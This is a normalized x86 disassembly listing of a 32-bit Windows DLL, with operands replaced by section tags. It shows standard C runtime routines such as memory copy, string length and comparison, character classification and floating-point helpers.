inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1000559b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_10006230
lea esi [ eax + 0x1 ]
push esi
call sub_10007b19
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_10007d33
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_100055f9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_1000559b
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10005620
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_100055db
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_1000559b
jmp r-xdata
sub_10005660
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100055db
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10005185
pop ecx
sub_10005687
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_10005620
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100056ac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_100079a5
pop ecx
sub_100056cc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1000895f
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10008736
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10007fb5
mov [ esi + 0x4 ] eax
sub_10005753
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push [ ebp + 0xc ]
push edi
call sub_10008ebe
pop ecx
pop ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
call sub_10007892
push 0x16
mov ebx [ ebp + 0x10 ]
mov eax [ ebx ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
mov [ edi ] 0x0
jmp r-xdata
mov eax esi
push 0x1
push [ eax + 0x4 ]
mov esi 0x100
push 0x0
push 0x0
push 0xffffffff
push edi
push esi
push ecx
push ebx
call sub_10008e78
mov ecx eax
add esp 0x24
mov [ ebp - 0xc ] ecx
test ecx ecx
jne r-xdata
cmp [ edi ] 0x0
mov ecx edi
je r-xdata
cmp [ ebp + 0xc ] ecx
jae r-xdata
call sub_10007892
mov [ eax ] 0x2a
xor eax eax
jmp r-xdata
mov al [ ecx ]
cmp al 0x41
jl r-xdata
test ecx ecx
jle r-xdata
mov [ edi ] 0x0
call sub_10007892
push 0x22
jmp r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008edb
leave
retn
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
cmp al 0x5a
jg r-xdata
and [ ebp - 0x8 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x1
jb r-xdata
pop esi
mov [ eax ] esi
call sub_10007840
jmp r-xdata
add al 0x20
mov [ ecx ] al
mov eax [ ebx ]
push 0x1
push [ eax + 0x4 ]
push ecx
push [ ebp - 0x8 ]
push 0xffffffff
push edi
push esi
push [ eax + 0x14 ]
push ebx
call sub_10008e78
add esp 0x24
test eax eax
je r-xdata
call sub_10007892
mov [ eax ] 0xc
jmp r-xdata
lea eax [ ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
call sub_10007892
push 0x2a
pop ecx
mov [ eax ] ecx
mov esi ecx
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
push edi
call sub_10007d33
add esp 0xc
mov esi eax
jmp r-xdata
call sub_10007892
mov eax [ eax ]
jmp r-xdata
push eax
call sub_10007b19
pop ecx
test eax eax
je r-xdata
call sub_10008ef0
mov eax esp
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_100056ac
pop ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add eax 0x8
sub_100058d1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005753
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10005905
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0xffffffff
push [ ebp + 0x8 ]
call sub_100058d1
mov eax [ ebp + 0x8 ]
add esp 0xc
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x0
mov edx eax
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
xor eax eax
pop ebp
retn
pop ebp
retn
mov cl [ edx ]
cmp cl 0x41
jl r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
cmp cl 0x5a
jg r-xdata
pop ebp
retn
add cl 0x20
mov [ edx ] cl
sub_10005986
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10005a5f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10005a7a
push 0xc
push r--data
call sub_10009700
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_10009745
retn
call sub_100095be
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_10007892
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_10009327
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005b2c
mov eax [ ebp - 0x1c ]
call sub_10007892
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_100098f0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_10005b50
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10005c0b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
movzx eax [ esi ]
sub eax edx
push edi
jne r-xdata
pop edi
pop esi
test eax eax
jns r-xdata
sub esi ecx
jle r-xdata
or eax 0xffffffff
pop ebp
retn
add ecx 0x2
movzx edx [ ecx ]
movzx eax [ esi + ecx ]
sub eax edx
je r-xdata
pop ebp
retn
xor eax eax
inc eax
test dx dx
je r-xdata
sub_10005c59
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005c49
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10005185
pop ecx
sub_10005c7a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10007892
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_10007840
mov eax esi
sub_10005cdd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_1000a23b
push esi
mov edi eax
call sub_1000a59e
push esi
call sub_1000a215
push eax
call sub_1000a4da
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_100079a5
and [ esi + 0x1c ] 0x0
pop ecx
sub_10005d4a
push 0xc
push r--data
call sub_10009700
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10009249
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10005cdd
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005db6
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_10009745
retn
mov eax [ ebp - 0x1c ]
sub_10005dd0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10005e54 ]
jmp [ ecx * 4 + jump_table_10005ed4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005f40 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_100060dc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10005fe0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100060dc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10005f40 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100060dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005f40 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005f40 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10005f40 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100060dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100060dc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100060dc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10006131
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1000a5cf
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10006182
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_10006131
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_100061b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_1000a5cf
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10006201
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100061b0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_10006230
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_100062bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_10006aae
add esp 0x10
mov edi eax
test esi esi
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_100068b5
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
sub_10006390
cmp [ rw-data ] 0x0
je r-xdata
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push [ rw-data ]
call sub_1000e658
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov ebx eax
mov eax 0x7ff0
and ecx eax
push ecx
push ecx
fstp [ esp ]
cmp cx ax
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
call sub_1000e4cd
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
pop ecx
fld [ ebp + 0x8 ]
pop ecx
fucompp
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_1000e50e
pop ecx
pop ecx
test eax eax
jle r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
push ebx
call sub_1000e658
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
push ebx
fadd [ r--data ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x8
jmp r-xdata
cmp eax 0x2
jle r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
push ebx
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x10
pop esi
pop ebx
leave
retn
call sub_1000e403
add esp 0x1c
push esi
push ebx
call sub_1000e658
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x3
jne r-xdata
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
je r-xdata
fld [ ebp + 0x8 ]
push ebx
push ecx
push ecx
fstp [ esp ]
push 0xc
call sub_1000e3ae
add esp 0x10
jmp r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x6
cmp eax 0x3ff
jl r-xdata
